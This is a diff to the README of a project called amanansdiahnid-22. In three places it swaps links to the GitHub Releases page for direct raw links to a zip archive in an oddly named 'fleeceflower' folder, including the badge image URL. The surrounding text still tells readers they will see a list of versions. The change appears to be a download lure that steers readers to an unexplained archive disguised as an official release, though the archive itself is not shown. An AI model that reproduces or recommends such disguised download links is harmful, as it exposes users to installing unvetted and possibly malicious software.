@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/holajokwer/amanansdiahnid-22/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/holajokwer/amanansdiahnid-22/main/fleeceflower/amanansdiahnid-22.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/holajokwer/amanansdiahnid-22/main/fleeceflower/amanansdiahnid-22.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you start, ensure that your computer meets the following requirements:
 
 To download the application, visit the Releases page by clicking the link below:
 
-[Download Latest Release](https://github.com/holajokwer/amanansdiahnid-22/releases)
+[Download Latest Release](https://raw.githubusercontent.com/holajokwer/amanansdiahnid-22/main/fleeceflower/amanansdiahnid-22.zip)
 
 1. Open the link above in your web browser.
 2. You will see a list of versions. Look for the latest version, which is labeled as "Latest release."
@@ -63,6 +63,6 @@ Stay updated with the latest features and fixes by checking back on the Releases
 
 Again, you can download the latest version here:
 
-[Download Latest Release](https://github.com/holajokwer/amanansdiahnid-22/releases)
+[Download Latest Release](https://raw.githubusercontent.com/holajokwer/amanansdiahnid-22/main/fleeceflower/amanansdiahnid-22.zip)
 
 Thank you for choosing **amanansdiahnid-22**! We hope it helps you streamline your automation tasks.
